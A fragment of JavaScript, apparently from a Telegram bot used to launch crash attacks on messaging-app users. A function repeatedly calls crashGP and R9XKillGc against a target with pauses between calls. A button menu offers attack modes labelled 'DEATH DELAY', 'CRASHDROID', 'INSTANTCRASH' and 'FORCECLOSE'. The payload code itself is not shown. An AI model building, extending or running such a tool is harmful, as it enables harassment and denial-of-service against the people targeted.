...
async function group_delays(isTarget) {
  for (let i = 0; i < 30; i++) {
    await index.crashGP(isTarget);
    await index.R9XKillGc(client, isTarget, false);
    console.log(chalk.green(`🍀‌⃕𝐍𝐯𝐫𝐬𝐗 ͢𖣂︎𝐓›‌𝐞𝐚𝐦⃜ : ${isTarget}`));
    await myfunction.sleep(1500);
  }
}
            ...
            reply_markup: {
                inline_keyboard: [
                    [
                        ...
                        { text: "⌰ 𝐃𝚵𝐀𝐓𝐇 𝐃𝚵𝐋𝚫𝐘", callback_data: `deatover ${isTarget}` }
                    ],
                    [
                        { text: "⏦ 𝐂𝚪𝚫𝐒𝐇𝐃𝐑𝚯𝐈𝐃", callback_data: `crashdroid ${isTarget}` },
                        { text: "⚡︎ 𝐈𝐍𝐒𝐓𝚫𝐍𝐓𝐂𝐑𝚫𝐒𝐇", callback_data: `instantcrash ${isTarget}` },
                        { text: "𝐅𝚯𝐑𝐂𝚵𝐂𝐋𝚯𝐒𝚵", callback_data: `forceclose ${isTarget}` }
                    ],
                    [
